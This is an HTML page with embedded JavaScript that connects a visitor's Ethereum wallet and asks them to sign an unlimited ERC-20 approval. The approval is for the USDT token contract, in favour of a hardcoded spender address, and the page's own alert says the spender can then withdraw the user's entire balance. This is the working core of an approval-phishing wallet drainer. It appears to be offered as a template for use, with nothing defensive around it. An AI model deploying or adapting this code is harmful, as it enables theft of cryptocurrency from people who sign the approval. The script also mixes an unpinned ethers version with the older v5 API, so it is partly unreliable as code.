<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Approve Token Transfer</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
</head>
<body>
  <button id="approveButton">Approve Max Token Withdrawal</button>

  <script>
    const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with your token's contract address
    const SPENDER_ADDRESS = "0xFdCfaA36e8eB1c2ea642aa3Cce39ebA319aF35a5"; // Replace with the address to approve spending
    const TOKEN_ABI = [
      // Minimal ABI to interact with an ERC-20 token
      "function approve(address spender, uint256 amount) external returns (bool)"
    ];

    document.getElementById("approveButton").addEventListener("click", async () => {
      try {
        // Check for wallet provider
        if (!window.ethereum) throw new Error("No Ethereum wallet found. Please install MetaMask.");

        // Request wallet connection
        await window.ethereum.request({ method: "eth_requestAccounts" });

        // Initialize provider and signer
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        // Initialize token contract
        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);

        // Define the maximum possible amount (2**256 - 1)
        const maxAmount = ethers.constants.MaxUint256;

        // Send the approve transaction
        const tx = await tokenContract.approve(SPENDER_ADDRESS, maxAmount);
        console.log("Approval transaction submitted:", tx.hash);

        // Wait for transaction confirmation
        const receipt = await tx.wait();
        console.log("Transaction confirmed:", receipt);
        alert("Approval successful! The spender can now withdraw your total balance.");
      } catch (error) {
        console.error("Error:", error);
        alert("Approval failed: " + error.message);
      }
    });
  </script>
</body>
</html>